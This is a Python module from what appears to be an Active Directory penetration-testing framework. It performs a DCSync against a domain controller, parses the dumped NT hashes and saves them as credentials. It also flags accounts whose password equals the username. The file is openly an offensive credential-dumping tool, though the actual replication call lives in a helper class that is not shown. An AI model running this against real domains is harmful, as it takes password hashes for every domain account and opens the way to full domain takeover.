import os

from module import BaseModule
from tool import Tool


class DCSync(BaseModule):
    path = "creds/dcsync"
    description = "Perform a DCSync against a domain controller"
    options = {
        "dc_ip": {"default": "", "description": "Domain Controller IP or host address. If empty. domain will be used.", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "domain_short": {"default": "", "description": "Optional NetBIOS/short domain name. Set if secretsdump complains about duplicate names.", "required": False},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
        "target_account": {"default": "", "description": "Target account for DCsync (ampty = ALL)", "required": False},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        dcsync_res = await tool.dcsync(
            self.opts.target_account,
            getattr(self.opts, "domain_short", ""),
        )

        for line in dcsync_res:
            if line.endswith(":::"):
                tab = line.split(":")
                if '\\' in tab[0]:
                    d, u = tab[0].split('\\')
                else:
                    d, u = self.opts.domain, tab[0]
                h = tab[3]

                # password == username quick win
                if self.registry._calculate_nthash(u) == h:
                    h = u

                if self.registry.add_credential(d, u, h):
                    if hasattr(self, 'pane_a'):
                        self.pane_a.write(f"✓ Added credential for `{u}@{d}` => `{h}`")
